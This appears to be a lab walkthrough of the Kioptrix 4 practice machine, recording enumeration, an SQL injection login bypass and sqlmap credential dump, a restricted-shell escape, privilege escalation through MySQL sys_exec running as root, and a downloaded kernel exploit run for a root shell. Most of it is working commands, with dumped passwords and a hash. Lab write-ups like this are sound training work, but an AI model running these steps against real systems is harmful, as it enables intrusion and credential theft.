###################################################################################################################################################################################################################
1) Enumeration

OS:
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33

Servicios:
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)


// nbtscan consigo el hostname
kioptrix4

// rpcclient "" deja acceder
...
enumdomusers
queryuser 0x88
getusrdompwinfo 0x88

!!!!!
// enum4linux
// version de samba
Samba 3.0.28a
// lista de nombres de usuario
users:
nobody
robert
root
john
loneferret

// nikto
Apache/2.2.8 (Ubuntu) - PHP/5.2.4 Suhosin-Patch

// dirbuster
index.php
/images/
/cgi-bin/
/checklogin.php
/icons/
/doc/
/member.php
/member/
/logout.php
/logout/
/john/
/john/john.php
/john/john/
/robert/


###################################################################################################################################################################################################################
2) Exploitation

!!!!!
// SQLI
' or 1=1-- '
//sqlmap...
// root@kali:~# sqlmap -u "http://192.168.182.154/checklogin.php" --data="myusername=john&mypassword=*"  -D members -T members --dump
Username 	: 	john
Password 	: 	MyNameIsJohn
---
Username 	: 	robert
Password 	: 	ADGAdsafdfwt4gadfga==

// salir de la shell controlada
echo os.system('/bin/bash')


// MYSQL
INSERT INTO `members` VALUES (1, 'john', '1234');
// Cred checklogin.php
$username="root"; // Mysql username
$password=""; // Mysql password
mysql> select * from members;
+----+----------+-----------------------+
| id | username | password              |
+----+----------+-----------------------+
|  1 | john     | MyNameIsJohn          | 
|  2 | robert   | ADGAdsafdfwt4gadfga== | 
+----+----------+-----------------------+
2 rows in set (0.00 sec)
mysql> select * from user;
localhost | debian-sys-maint | *3AC38ADE5482EA4DE628D0D43BF8FA41E3CF3879

###################################################################################################################################################################################################################

3) Privilege Escalation

3.1) Using mysql system call
!!!!!
// MySQL running as root
mysql> select sys_exec('usermod -a -G admin john');
// Verifico que funciona
john@Kioptrix4:/var/www$ id
uid=1001(john) gid=1001(john) groups=1001(john)
john@Kioptrix4:/var/www$ sudo su
root@Kioptrix4:/var/www# id                                                                                                     
uid=0(root) gid=0(root) groups=0(root)



3.2) Using a Kernel Exploit
!!!!!
https://www.exploit-db.com/exploits/9641/
https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/9641.tar.gz
// Compilo en una maquina de 32 bitr

//Compruebo que iptables me bloquea
john@Kioptrix4:~$ iptables -L
iptables v1.3.8: can't initialize iptables table `filter': Permission denied (you must be root)
robert@Kioptrix4:/tmp$ cat /etc/iptables.rules
# Generated by iptables-save v1.3.8 on Mon Feb  6 20:00:52 2012
*filter
:INPUT ACCEPT [6150:1120650]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [969:93214]
-A INPUT -p tcp -m tcp --dport 4444 -j DROP 
-A INPUT -p tcp -m tcp --dport 1337:6000 -j DROP 
-A INPUT -p tcp -m tcp --dport 10000:31337 -j DROP 
-A INPUT -p tcp -m tcp --dport 8080 -j DROP 
-A OUTPUT -p tcp -m tcp --dport 4444 -j DROP 
-A OUTPUT -p tcp -m tcp --dport 1337:6000 -j DROP 
-A OUTPUT -p tcp -m tcp --dport 10000:31337 -j DROP 
-A OUTPUT -p tcp -m tcp --dport 8080 -j DROP 
-A OUTPUT -p tcp -m tcp --dport 80 -j DROP 
-A OUTPUT -p tcp -m tcp --dport 21 -j DROP 
COMMIT

// Pongo el Apache de la Kali en el puerto 8088
// Descargo el fichero en tmp y lo ejecuto
john@Kioptrix4:/tmp$ chmod +x Exploit1-3 
john@Kioptrix4:/tmp$ ./Exploit1-3 
# 
# 
# id
uid=0(root) gid=0(root) groups=115(admin),1001(john)


###################################################################################################################################################################################################################

Links:
https://www.kernel-exploits.com/














